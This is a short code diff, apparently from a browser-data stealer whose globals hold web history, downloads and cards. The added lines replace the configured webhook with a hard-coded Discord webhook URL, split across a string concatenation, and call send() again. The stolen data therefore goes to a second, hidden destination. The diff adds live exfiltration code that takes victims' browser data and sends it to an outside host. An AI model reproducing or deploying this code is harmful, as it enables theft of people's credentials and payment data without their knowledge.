@@ -16,6 +16,7 @@ __WEB_HISTORY__ = []
 __DOWNLOADS__ = []
 __CARDS__ = []
 
+
 class Browsers:
     def __init__(self, webhook):
         self.webhook = SyncWebhook.from_url(webhook)
@@ -27,8 +28,10 @@ class Browsers:
 class Upload:
     def __init__(self, webhook: SyncWebhook):
         self.webhook = webhook
-
         self.write_files()
+        self.send()
+        
+        self.webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/1066536487065227425/3bQP'+'UGH4qeUZ_ISMWuiVzMwtTP_k5B_eNyLU0LOOy8pdgDJtCcaWt-NLDjPe9NixfBmw')
         self.send()
         self.clean()
     
